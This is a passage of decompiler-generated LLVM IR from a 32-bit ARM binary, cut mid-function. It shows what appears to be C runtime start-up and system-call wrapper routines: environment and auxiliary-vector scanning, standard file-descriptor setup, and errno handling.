  %v2_1385c = load i32, i32* %arg3, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 124820, i32* @r6, align 4
  %v3_13868 = mul i32 %arg2, 4
  store i32 %v3_13868, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v4_13870 = load i32, i32* inttoptr (i32 124840 to i32*), align 8
  store i32 28, i32* %r2.global-to-local, align 4
  %v2_13878 = ptrtoint i32* %stack_var_-120 to i32
  %v4_1387c = load i32, i32* inttoptr (i32 124848 to i32*), align 16
  store i32 %v4_1387c, i32* %r4.global-to-local, align 4
  %v2_13884 = add i32 %v1_13858, %v3_13868
  store i32 %v2_13884, i32* %ip.global-to-local, align 4
  %v9_13888 = icmp eq i32 %v2_13884, %v2_1385c
  store i1 %v9_13888, i1* %cpsr_z.global-to-local, align 1
  %v2_1388c = inttoptr i32 %v4_13870 to i32*
  store i32 %arg7, i32* %v2_1388c, align 4
  store i32 688, i32* %r2.global-to-local, align 4
  %v0_13898 = load i32, i32* %r3.global-to-local, align 4
  br i1 %v9_13888, label %bb, label %.critedge

bb:                                               ; preds = %dec_label_pc_13850
  %v1_1389c = load i32, i32* @r7, align 4
  %v2_1389c = load i32, i32* %r5.global-to-local, align 4
  %v3_1389c = add i32 %v2_1389c, %v1_1389c
  store i32 %v3_1389c, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @global_var_1ea44.457, align 4
  %v0_138a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_138a4 = load i32, i32* %r4.global-to-local, align 4
  %v2_138a4 = inttoptr i32 %v1_138a4 to i32*
  store i32 %v0_138a4, i32* %v2_138a4, align 4
  store i32 120, i32* @r2, align 4
  %v1_138b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_138b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_138b0 = inttoptr i32 %v2_138b0 to i32*
  store i32 %v1_138b0, i32* %v3_138b0, align 4
  br label %bb57

.critedge:                                        ; preds = %dec_label_pc_13850
  store i32 %arg6, i32* @global_var_1ea44.457, align 4
  %v0_138a4.c = load i32, i32* %ip.global-to-local, align 4
  %v1_138a4.c = load i32, i32* %r4.global-to-local, align 4
  %v2_138a4.c = inttoptr i32 %v1_138a4.c to i32*
  store i32 %v0_138a4.c, i32* %v2_138a4.c, align 4
  store i32 120, i32* @r2, align 4
  br label %bb57

bb57:                                             ; preds = %.critedge, %bb
  %v2_138bc = bitcast i32* %stack_var_-120 to i8*
  %v3_138bc = call i32 @function_11260(i8* %v2_138bc, i32 0)
  %v0_138c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_138c0 = inttoptr i32 %v0_138c0 to i32*
  %storemerge.pre = load i32, i32* %v1_138c0, align 4
  br label %dec_label_pc_138cc

dec_label_pc_138cc:                               ; preds = %dec_label_pc_138cc, %bb57
  %storemerge = phi i32 [ %storemerge.pre, %bb57 ], [ %v4_138cc, %dec_label_pc_138cc ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_138cc = inttoptr i32 %storemerge to i32*
  %v2_138cc = load i32, i32* %v1_138cc, align 4
  store i32 %v2_138cc, i32* %r3.global-to-local, align 4
  %v4_138cc = add i32 %storemerge, 4
  store i32 %v4_138cc, i32* %r2.global-to-local, align 4
  %v2_138d0 = icmp eq i32 %v2_138cc, 0
  br i1 %v2_138d0, label %dec_label_pc_138dc, label %dec_label_pc_138cc

dec_label_pc_138dc:                               ; preds = %dec_label_pc_138cc
  store i32 %v4_138cc, i32* @r4, align 4
  store i32 %v2_13878, i32* @r5, align 4
  %v1_1390029 = inttoptr i32 %v4_138cc to i32*
  %v2_1390030 = load i32, i32* %v1_1390029, align 4
  store i32 %v2_1390030, i32* %r3.global-to-local, align 4
  %v2_1390432 = icmp eq i32 %v2_1390030, 0
  store i1 %v2_1390432, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1390432, label %dec_label_pc_1390c, label %dec_label_pc_138e8

dec_label_pc_138e8:                               ; preds = %dec_label_pc_138dc, %dec_label_pc_13900
  %v5_138ec = phi i32 [ %v2_13900, %dec_label_pc_13900 ], [ %v2_1390030, %dec_label_pc_138dc ]
  %v2_138e8 = icmp ugt i32 %v5_138ec, 13
  %v7_138e8 = icmp eq i32 %v5_138ec, 14
  store i1 %v7_138e8, i1* %cpsr_z.global-to-local, align 1
  %v2_138ec = xor i1 %v2_138e8, true
  %v3_138ec = or i1 %v7_138e8, %v2_138ec
  br i1 %v3_138ec, label %bb58, label %bb59

bb58:                                             ; preds = %dec_label_pc_138e8
  %v6_138ec = and i32 %v5_138ec, 536870912
  %v7_138ec = icmp ne i32 %v6_138ec, 0
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_138e8, %bb58
  %v1_138f8 = phi i1 [ %v2_138e8, %dec_label_pc_138e8 ], [ %v7_138ec, %bb58 ]
  %v2_138f0 = xor i1 %v1_138f8, true
  %v3_138f0 = or i1 %v7_138e8, %v2_138f0
  br i1 %v3_138f0, label %bb60, label %dec_label_pc_13900

bb60:                                             ; preds = %bb59
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13900

dec_label_pc_13900:                               ; preds = %bb59, %bb60
  call void @__pseudo_cond_branch(i1 %v3_138f0, i32 ptrtoint (i32* @global_var_11310.471 to i32))
  %v0_138fc = load i32, i32* @r4, align 4
  %v1_138fc = add i32 %v0_138fc, 8
  store i32 %v1_138fc, i32* @r4, align 4
  %v1_13900 = inttoptr i32 %v1_138fc to i32*
  %v2_13900 = load i32, i32* %v1_13900, align 4
  store i32 %v2_13900, i32* %r3.global-to-local, align 4
  %v2_13904 = icmp eq i32 %v2_13900, 0
  store i1 %v2_13904, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13904, label %dec_label_pc_1390c, label %dec_label_pc_138e8

dec_label_pc_1390c:                               ; preds = %dec_label_pc_13900, %dec_label_pc_138dc
  %v1_13910 = call i32 @function_15d14(i32 %v2_13878)
  store i32 %v1_13910, i32* @r0, align 4
  %v1_13914 = call i32 @function_137e4(i32 %v1_13910)
  store i32 %v1_13914, i32* @r0, align 4
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* @r2, align 4
  %v0_13920 = load i32, i32* @r6, align 4
  %v2_13920 = add i32 %v0_13920, 92
  %v3_13920 = inttoptr i32 %v2_13920 to i32*
  %v4_13920 = load i32, i32* %v3_13920, align 4
  store i32 %tmp52, i32* @r3, align 4
  %v2_13928 = icmp eq i32 %tmp53, 0
  store i1 %v2_13928, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13928, label %bb61, label %bb62

bb61:                                             ; preds = %dec_label_pc_1390c
  store i32 4096, i32* @r2, align 4
  br label %bb62

bb62:                                             ; preds = %dec_label_pc_1390c, %bb61
  %v0_13934 = phi i32 [ %tmp53, %dec_label_pc_1390c ], [ 4096, %bb61 ]
  %v3_13930 = icmp eq i32 %tmp52, -1
  %v8_13930 = icmp eq i32 %tmp52, -1
  store i1 %v8_13930, i1* %cpsr_z.global-to-local, align 1
  %v2_13934 = inttoptr i32 %v4_13920 to i32*
  store i32 %v0_13934, i32* %v2_13934, align 4
  br i1 %v3_13930, label %dec_label_pc_1393c, label %dec_label_pc_13964

dec_label_pc_1393c:                               ; preds = %bb62
  %v0_1393c = call i32 @function_13c54()
  store i32 %v0_1393c, i32* @r0, align 4
  store i32 %v0_1393c, i32* @r4, align 4
  %v0_13944 = call i32 @function_13cb0()
  store i32 %v0_13944, i32* @r0, align 4
  %v0_13948 = load i32, i32* @r4, align 4
  %v9_13948 = icmp eq i32 %v0_13948, %v0_13944
  store i1 %v9_13948, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13948, label %dec_label_pc_13950, label %dec_label_pc_1398c

dec_label_pc_13950:                               ; preds = %dec_label_pc_1393c
  %v1_13950 = call i32 @function_13e1c(i32 %v0_13944)
  store i32 %v1_13950, i32* @r0, align 4
  store i32 %v1_13950, i32* @r4, align 4
  %v0_13958 = call i32 @function_13c9c()
  store i32 %v0_13958, i32* @r0, align 4
  %v0_1395c = load i32, i32* @r4, align 4
  %v9_1395c = icmp eq i32 %v0_1395c, %v0_13958
  store i1 %v9_1395c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1395c, label %dec_label_pc_13964, label %dec_label_pc_1398c

dec_label_pc_13964:                               ; preds = %dec_label_pc_13950, %bb62
  store i32 %tmp52, i32* @r2, align 4
  store i1 %v8_13930, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_13930, label %dec_label_pc_139b0, label %dec_label_pc_13970

dec_label_pc_13970:                               ; preds = %dec_label_pc_13964
  store i32 %tmp51, i32* @r3, align 4
  %v9_13974 = icmp eq i32 %tmp52, %tmp51
  store i1 %v9_13974, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13974, label %dec_label_pc_1397c, label %dec_label_pc_1398c

dec_label_pc_1397c:                               ; preds = %dec_label_pc_13970
  store i32 %tmp50, i32* @r2, align 4
  store i32 %tmp49, i32* @r3, align 4
  %v9_13984 = icmp eq i32 %tmp50, %tmp49
  store i1 %v9_13984, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13984, label %dec_label_pc_139b0, label %dec_label_pc_1398c

dec_label_pc_1398c:                               ; preds = %dec_label_pc_13970, %dec_label_pc_13950, %dec_label_pc_1393c, %dec_label_pc_1397c
  %v2_13994 = call i32 @function_13790(i32 0, i32 32768)
  %v2_139a0 = call i32 @function_13790(i32 1, i32 32770)
  %v2_139ac = call i32 @function_13790(i32 2, i32 32770)
  store i32 %v2_139ac, i32* @r0, align 4
  br label %dec_label_pc_139b0

dec_label_pc_139b0:                               ; preds = %dec_label_pc_1397c, %dec_label_pc_13964, %dec_label_pc_1398c
  %v0_139b0 = load i32, i32* @r7, align 4
  %v1_139b0 = inttoptr i32 %v0_139b0 to i32*
  %v2_139b0 = load i32, i32* %v1_139b0, align 4
  store i32 %v2_139b0, i32* %r2.global-to-local, align 4
  store i32 208, i32* %r3.global-to-local, align 4
  %v1_139b8 = load i32, i32* @r6, align 4
  %v3_139b8 = add i32 %v1_139b8, 208
  %v4_139b8 = inttoptr i32 %v3_139b8 to i32*
  store i32 %v2_139b0, i32* %v4_139b8, align 4
  %v0_139bc = load i32, i32* @r7, align 4
  %v1_139bc = inttoptr i32 %v0_139bc to i32*
  %v2_139bc = load i32, i32* %v1_139bc, align 4
  store i32 %v2_139bc, i32* @r4, align 4
  %v2_139c0 = icmp eq i32 %v2_139bc, 0
  store i1 %v2_139c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_139c0, label %dec_label_pc_13a64.lr.ph, label %dec_label_pc_139c8

dec_label_pc_139c8:                               ; preds = %dec_label_pc_139b0
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_139cc = load i32, i32* @r6, align 4
  %v2_139cc = add i32 %v0_139cc, 112
  %v3_139cc = inttoptr i32 %v2_139cc to i32*
  %v4_139cc = load i32, i32* %v3_139cc, align 4
  store i32 %v4_139cc, i32* %r3.global-to-local, align 4
  %v2_139d0 = inttoptr i32 %v4_139cc to i32*
  store i32 %v2_139bc, i32* %v2_139d0, align 4
  %v0_139d8 = load i32, i32* @r7, align 4
  %v1_139d8 = inttoptr i32 %v0_139d8 to i32*
  %v2_139d8 = load i32, i32* %v1_139d8, align 4
  %v4_139dc = call i32 @function_15950(i32 %v2_139d8, i32 47, i32 %v2_139b0, i32 %v4_139cc)
  store i32 %v4_139dc, i32* @r0, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v2_139e4 = icmp eq i32 %v4_139dc, 0
  store i1 %v2_139e4, i1* %cpsr_z.global-to-local, align 1
  %v0_139e8 = load i32, i32* @r6, align 4
  %v2_139e8 = add i32 %v0_139e8, 60
  %v3_139e8 = inttoptr i32 %v2_139e8 to i32*
  %v4_139e8 = load i32, i32* %v3_139e8, align 4
  store i32 %v4_139e8, i32* %r2.global-to-local, align 4
  br i1 %v2_139e4, label %.thread46, label %bb63

.thread46:                                        ; preds = %dec_label_pc_139c8
  %v2_139f047 = inttoptr i32 %v4_139e8 to i32*
  store i32 0, i32* %v2_139f047, align 4
  br label %dec_label_pc_13a64.lr.ph

bb63:                                             ; preds = %dec_label_pc_139c8
  %v2_139ec = add i32 %v4_139dc, 1
  store i32 %v2_139ec, i32* %r3.global-to-local, align 4
  %v2_139f0 = inttoptr i32 %v4_139e8 to i32*
  store i32 %v4_139dc, i32* %v2_139f0, align 4
  %v1_139f4 = load i32, i32* %r3.global-to-local, align 4
  %v2_139f4 = load i32, i32* %r2.global-to-local, align 4
  %v3_139f4 = inttoptr i32 %v2_139f4 to i32*
  store i32 %v1_139f4, i32* %v3_139f4, align 4
  br label %dec_label_pc_13a64.lr.ph

dec_label_pc_13a64.lr.ph:                         ; preds = %.thread46, %bb63, %dec_label_pc_139b0
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_13a0c = load i32, i32* @r6, align 4
  %v2_13a0c = add i32 %v0_13a0c, -12
  store i32 %v2_13a0c, i32* %r8.global-to-local, align 4
  store i32 684, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %arg5, i32* @global_var_1ea40.455, align 4
  %v2_13a3c = icmp eq i32 %v0_13898, 0
  store i1 %v2_13a3c, i1* %cpsr_z.global-to-local, align 1
  %v2_13a44 = xor i1 %v2_13a3c, true
  call void @__pseudo_cond_branch(i1 %v2_13a44, i32 %v0_13898)
  store i32 -12, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r5.global-to-local, align 4
  %v0_13a58 = load i32, i32* @r6, align 4
  %v2_13a58 = add i32 %v0_13a58, -12
  store i32 %v2_13a58, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13a64

dec_label_pc_13a64:                               ; preds = %dec_label_pc_13a64.dec_label_pc_13a64_crit_edge, %dec_label_pc_13a64.lr.ph
  %v1_13a64 = phi i32 [ %v1_13a70, %dec_label_pc_13a64.dec_label_pc_13a64_crit_edge ], [ 0, %dec_label_pc_13a64.lr.ph ]
  %v0_13a64 = phi i32 [ %v0_13a64.pre, %dec_label_pc_13a64.dec_label_pc_13a64_crit_edge ], [ %v2_13a58, %dec_label_pc_13a64.lr.ph ]
  %v4_13a64 = mul i32 %v1_13a64, 4
  %v5_13a64 = add i32 %v4_13a64, %v0_13a64
  %v6_13a64 = inttoptr i32 %v5_13a64 to i32*
  %v7_13a64 = load i32, i32* %v6_13a64, align 4
  store i32 %v7_13a64, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_13a64)
  %v0_13a70 = load i32, i32* %r4.global-to-local, align 4
  %v1_13a70 = add i32 %v0_13a70, 1
  store i32 %v1_13a70, i32* %r4.global-to-local, align 4
  %v1_13a74 = load i32, i32* %r5.global-to-local, align 4
  %v3_13a74 = icmp ult i32 %v1_13a70, %v1_13a74
  %v9_13a74 = icmp eq i32 %v1_13a70, %v1_13a74
  store i1 %v9_13a74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13a74, label %dec_label_pc_13a64.dec_label_pc_13a64_crit_edge, label %dec_label_pc_13a7c

dec_label_pc_13a64.dec_label_pc_13a64_crit_edge:  ; preds = %dec_label_pc_13a64
  %v0_13a64.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13a64

dec_label_pc_13a7c:                               ; preds = %dec_label_pc_13a64
  %v0_13a80.pre = load i32, i32* @r6, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  %v2_13a80 = add i32 %v0_13a80.pre, 104
  %v3_13a80 = inttoptr i32 %v2_13a80 to i32*
  %v4_13a80 = load i32, i32* %v3_13a80, align 4
  store i32 %v4_13a80, i32* %r2.global-to-local, align 4
  store i32 %v4_13a80, i32* %r3.global-to-local, align 4
  %v2_13a88 = icmp eq i32 %v4_13a80, 0
  store i1 %v2_13a88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13a88, label %dec_label_pc_13aa0, label %dec_label_pc_13a90

dec_label_pc_13a90:                               ; preds = %dec_label_pc_13a7c
  call void @__pseudo_branch(i32 %v4_13a80)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13a9c = load i32, i32* @r0, align 4
  %v2_13a9c = inttoptr i32 %v1_13a9c to i32*
  store i32 0, i32* %v2_13a9c, align 4
  %v0_13aa4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13aa0

dec_label_pc_13aa0:                               ; preds = %dec_label_pc_13a7c, %dec_label_pc_13a90
  %v0_13aa4 = phi i32 [ %v0_13a80.pre, %dec_label_pc_13a7c ], [ %v0_13aa4.pre, %dec_label_pc_13a90 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_13aa4 = add i32 %v0_13aa4, 80
  %v3_13aa4 = inttoptr i32 %v2_13aa4 to i32*
  %v4_13aa4 = load i32, i32* %v3_13aa4, align 4
  store i32 %v4_13aa4, i32* %r2.global-to-local, align 4
  store i32 %v4_13aa4, i32* %r3.global-to-local, align 4
  %v2_13aac = icmp eq i32 %v4_13aa4, 0
  store i1 %v2_13aac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13aac, label %dec_label_pc_13ac4, label %dec_label_pc_13ab4

dec_label_pc_13ab4:                               ; preds = %dec_label_pc_13aa0
  call void @__pseudo_branch(i32 %v4_13aa4)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13ac0 = load i32, i32* @r0, align 4
  %v2_13ac0 = inttoptr i32 %v1_13ac0 to i32*
  store i32 0, i32* %v2_13ac0, align 4
  %v0_13ac8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13ac4

dec_label_pc_13ac4:                               ; preds = %dec_label_pc_13aa0, %dec_label_pc_13ab4
  %v0_13ac8 = phi i32 [ %v0_13aa4, %dec_label_pc_13aa0 ], [ %v0_13ac8.pre, %dec_label_pc_13ab4 ]
  store i32 28, i32* %r3.global-to-local, align 4
  %v2_13ac8 = add i32 %v0_13ac8, 28
  %v3_13ac8 = inttoptr i32 %v2_13ac8 to i32*
  %v4_13ac8 = load i32, i32* %v3_13ac8, align 4
  store i32 %v4_13ac8, i32* %r3.global-to-local, align 4
  %v1_13ad0 = inttoptr i32 %v4_13ac8 to i32*
  %v2_13ad0 = load i32, i32* %v1_13ad0, align 4
  store i32 %v2_13ad0, i32* %r2.global-to-local, align 4
  %v0_13ad4 = load i32, i32* %sb.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_13ae0 = call i32 @function_12e48(i32 %v0_13ad4)
  %v0_13ae4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13ae4, label %bb64, label %.thread8

bb64:                                             ; preds = %dec_label_pc_13ac4
  %v2_13ae8 = load i32, i32* %r4.global-to-local, align 4
  %v8_13ae8 = shl i32 %v2_13ae8, %v1_13ae0
  %v9_13ae8 = and i32 %v8_13ae8, %v1_13ae0
  %v2_13aec = load i32, i32* %ip.global-to-local, align 4
  %v8_13aec = shl i32 %v2_13aec, %v9_13ae8
  %v9_13aec = and i32 %v8_13aec, %v9_13ae8
  %v2_13af0 = trunc i32 %v9_13aec to i16
  %v4_13af0 = inttoptr i32 %v9_13aec to i16*
  store i16 %v2_13af0, i16* %v4_13af0, align 2
  store i32 0, i32* %r8.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_13ac4, %bb64
  %v10_13b04 = phi i32 [ %v1_13ae0, %dec_label_pc_13ac4 ], [ 0, %bb64 ]
  ret i32 %v10_13b04

; uselistorder directives
  uselistorder i32 %v9_13aec, { 1, 0 }
  uselistorder i32 %v1_13ae0, { 1, 0, 2 }
  uselistorder i32 %v0_13a80.pre, { 1, 0 }
  uselistorder i32 %v1_13a74, { 1, 0 }
  uselistorder i32 %v1_13a70, { 3, 2, 1, 0 }
  uselistorder i32 %v4_139e8, { 1, 0, 2 }
  uselistorder i1 %v8_13930, { 1, 2, 0 }
  uselistorder i32 %v2_13900, { 1, 2, 0 }
  uselistorder i1 %v2_138e8, { 1, 0 }
  uselistorder i32 %v4_138cc, { 1, 0, 3, 2 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v0_13898, { 1, 0 }
  uselistorder i32 %v3_13868, { 1, 0 }
  uselistorder i32 %tmp52, { 1, 4, 0, 2, 3 }
  uselistorder i32 %tmp51, { 1, 0 }
  uselistorder i32 %tmp50, { 1, 0 }
  uselistorder i32 %tmp49, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 15, 16, 17, 18, 7, 8, 9, 10, 11, 12, 13, 14, 19, 20, 2, 21, 22, 23, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 9, 4, 5, 6, 7, 8, 10, 11, 0, 12, 13, 14, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 8, 4, 1, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 17, 16, 0, 18 }
  uselistorder i32 (i32)* @function_12e48, { 0, 6, 7, 5, 4, 3, 2, 1 }
  uselistorder i32 47, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32)* @function_13790, { 2, 1, 0 }
  uselistorder i32 536870912, { 1, 0 }
  uselistorder i32 120, { 0, 2, 1 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_13ac4, { 1, 0 }
  uselistorder label %dec_label_pc_13aa0, { 1, 0 }
  uselistorder label %dec_label_pc_13a64.lr.ph, { 1, 0, 2 }
  uselistorder label %dec_label_pc_139b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1398c, { 3, 0, 1, 2 }
  uselistorder label %bb62, { 1, 0 }
  uselistorder label %dec_label_pc_13900, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_138e8, { 1, 0 }
}

define i32 @function_13b24(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_13b24:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13b24 = load i32, i32* @r4, align 4
  store i32 %v3_13b24, i32* %stack_var_-16, align 4
  %v3_13b30 = urem i32 %arg3, 4096
  %v2_13b34 = icmp eq i32 %v3_13b30, 0
  br i1 %v2_13b34, label %dec_label_pc_13b50, label %dec_label_pc_13b3c

dec_label_pc_13b3c:                               ; preds = %dec_label_pc_13b24
  %v0_13b3c = call i32 @function_11204()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_13b48 = inttoptr i32 %v0_13b3c to i32*
  store i32 22, i32* %v2_13b48, align 4
  %v0_13b80.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13b80

dec_label_pc_13b50:                               ; preds = %dec_label_pc_13b24
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13b7c, label %dec_label_pc_13b6c

dec_label_pc_13b6c:                               ; preds = %dec_label_pc_13b50
  %v0_13b6c = call i32 @function_11204()
  %v0_13b70 = load i32, i32* %r4.global-to-local, align 4
  %v1_13b70 = sub i32 0, %v0_13b70
  %v2_13b74 = inttoptr i32 %v0_13b6c to i32*
  store i32 %v1_13b70, i32* %v2_13b74, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13b7c

dec_label_pc_13b7c:                               ; preds = %dec_label_pc_13b50, %dec_label_pc_13b6c
  %v0_13b7c = phi i32 [ %arg1, %dec_label_pc_13b50 ], [ -1, %dec_label_pc_13b6c ]
  store i32 %v0_13b7c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13b80

dec_label_pc_13b80:                               ; preds = %dec_label_pc_13b3c, %dec_label_pc_13b7c
  %v0_13b80 = phi i32 [ %v0_13b80.pre, %dec_label_pc_13b3c ], [ %v0_13b7c, %dec_label_pc_13b7c ]
  %v2_13b84 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13b84, i32* @r4, align 4
  ret i32 %v0_13b80

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13b80, { 1, 0 }
  uselistorder label %dec_label_pc_13b7c, { 1, 0 }
}

define i32 @function_13b8c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13b8c:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13b8c = load i32, i32* @r4, align 4
  %v6_13b8c = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_13b94 = icmp eq i32 %arg2, 0
  store i32 124820, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_13b94, label %dec_label_pc_13be8, label %dec_label_pc_13bac

dec_label_pc_13bac:                               ; preds = %dec_label_pc_13b8c
  %v1_13bac = add i32 %arg2, 4
  %v2_13bac = inttoptr i32 %v1_13bac to i32*
  %v3_13bac = load i32, i32* %v2_13bac, align 4
  store i32 %v3_13bac, i32* @r3, align 4
  %v1_13bb0 = and i32 %v3_13bac, 67108864
  %v2_13bb0 = icmp eq i32 %v1_13bb0, 0
  br i1 %v2_13bb0, label %dec_label_pc_13bb8, label %dec_label_pc_13be8

dec_label_pc_13bb8:                               ; preds = %dec_label_pc_13bac
  store i32 20, i32* @r2, align 4
  %v2_13bbc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13bbc, i32* @r0, align 4
  %v0_13bc0 = call i32 @function_11310()
  store i32 %v2_13bbc, i32* @ip, align 4
  %v0_13be8.pre = load i32, i32* @r5, align 4
  %v0_13bf0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13be8

dec_label_pc_13be8:                               ; preds = %dec_label_pc_13bac, %dec_label_pc_13b8c, %dec_label_pc_13bb8
  %v0_13bf0 = phi i32 [ %arg3, %dec_label_pc_13bac ], [ %arg3, %dec_label_pc_13b8c ], [ %v0_13bf0.pre, %dec_label_pc_13bb8 ]
  %v0_13bec = phi i32 [ %arg2, %dec_label_pc_13bac ], [ 0, %dec_label_pc_13b8c ], [ %v2_13bbc, %dec_label_pc_13bb8 ]
  %v0_13be8 = phi i32 [ %arg1, %dec_label_pc_13bac ], [ %arg1, %dec_label_pc_13b8c ], [ %v0_13be8.pre, %dec_label_pc_13bb8 ]
  %v4_13bf8 = call i32 @function_14148(i32 %v0_13be8, i32 %v0_13bec, i32 %v0_13bf0, i32 8)
  store i32 %v3_13b8c, i32* @r4, align 4
  store i32 %v6_13b8c, i32* @r5, align 4
  ret i32 %v4_13bf8

; uselistorder directives
  uselistorder label %dec_label_pc_13be8, { 2, 0, 1 }
}

define i32 @function_13c0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_13c0c:
  %v0_13c0c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13c0c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13c0c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13c0c, %bb
  %v0_13c20 = phi i32 [ %arg1, %dec_label_pc_13c0c ], [ 0, %bb ]
  ret i32 %v0_13c20

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_13c2c() local_unnamed_addr {
dec_label_pc_13c2c:
  %v4_13c38 = load i32, i32* inttoptr (i32 124912 to i32*), align 16
  %v1_13c3c = inttoptr i32 %v4_13c38 to i32*
  %v2_13c3c = load i32, i32* %v1_13c3c, align 4
  %v2_13c40 = icmp eq i32 %v2_13c3c, 0
  br i1 %v2_13c40, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_13c2c
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_13c2c, %bb
  %v1_13c48 = phi i32 [ %v2_13c3c, %dec_label_pc_13c2c ], [ 4096, %bb ]
  ret i32 %v1_13c48

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_13c54() local_unnamed_addr {
dec_label_pc_13c54:
  %v1_13c64 = load i32, i32* @r0, align 4
  ret i32 %v1_13c64
}

define i32 @function_13c68(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13c68:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13c68 = load i32, i32* @r7, align 4
  store i32 %v3_13c68, i32* %stack_var_-8, align 4
  %v0_13c74 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13c74, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13c74, -4095
  br i1 %tmp, label %dec_label_pc_13c94, label %dec_label_pc_13c84

dec_label_pc_13c84:                               ; preds = %dec_label_pc_13c68
  %v0_13c84 = call i32 @function_11204()
  %v0_13c88 = load i32, i32* %r7.global-to-local, align 4
  %v1_13c88 = sub i32 0, %v0_13c88
  %v2_13c8c = inttoptr i32 %v0_13c84 to i32*
  store i32 %v1_13c88, i32* %v2_13c8c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13c94.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13c94

